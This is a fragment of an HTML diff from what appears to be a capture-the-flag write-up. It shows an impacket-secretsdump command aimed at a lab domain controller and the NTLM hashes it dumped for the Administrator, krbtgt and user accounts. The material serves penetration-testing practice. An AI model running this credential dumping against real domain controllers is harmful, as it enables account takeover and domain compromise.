+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022061314.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -just-dc-ntlm Administrator@10.10.11.158</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:45be1d36942e3eb589e8b0d372198f3d:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f5142aae3cce656285ce4504605dec1:::</span><br><span class="line">JDgodd:1104:aad3b435b51404eeaad3b435b51404ee:8846130392c4169cb552fe5b73b046af:::</span><br><span class="line">Martin:1105:aad3b435b51404eeaad3b435b51404ee:a9347432fb0034dd1814ca794793d377:::</span><br><span class="line">nikk37:1106:aad3b435b51404eeaad3b435b51404ee:17a54d09dd09920420a6cb9b78534764:::</span><br><span class="line">yoshihide:1107:aad3b435b51404eeaad3b435b51404ee:6d21f46be3697ba16b6edef7b3399bf4:::</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:fac45a493cb064a17fabefae8d723613:::</span></span><br></pre></td></tr></table></figure>
 
 
